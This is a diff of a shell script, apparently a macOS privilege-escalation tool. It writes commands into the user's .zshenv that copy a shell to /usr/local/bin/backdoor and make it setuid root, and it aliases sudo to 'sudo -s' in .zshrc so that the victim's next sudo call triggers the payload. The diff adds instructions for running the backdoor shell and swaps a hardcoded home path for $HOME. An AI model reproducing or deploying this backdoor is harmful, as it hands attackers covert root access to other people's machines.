@@ -44,17 +44,18 @@ then
         echo ""
 	echo "Now let the user run some elevated command via sudo on the MacOS "
 	echo "A setuid 0 shell is available in /usr/local/bin/backdoor " 
-
+        echo "Run it as /usr/local/bin/backdoor -p"
 else   
        	echo "[-] .zshenv does not exist !"
         echo "Creating one " 
 	echo 'cp .shell /usr/local/bin/backdoor > /dev/null 2>&1' >> $HOME/.zshenv
         echo 'chmod +s /usr/local/bin/backdoor > /dev/null 2>&1' >> $HOME/.zshenv
         echo 'alias sudo="sudo -s"' >> $HOME/.zshrc
-        cp ./shell /home/ubuntu/Home/.shell
+        cp ./shell $HOME/.shell
         echo "" 
 	echo "Now let the user run some elevated command via sudo on the MacOS "
         echo "A setuid 0 shell is available in /usr/local/bin/backdoor "
+        echo "Run it as /usr/local/bin/backdoor -p"
 fi
 
 exit 0 
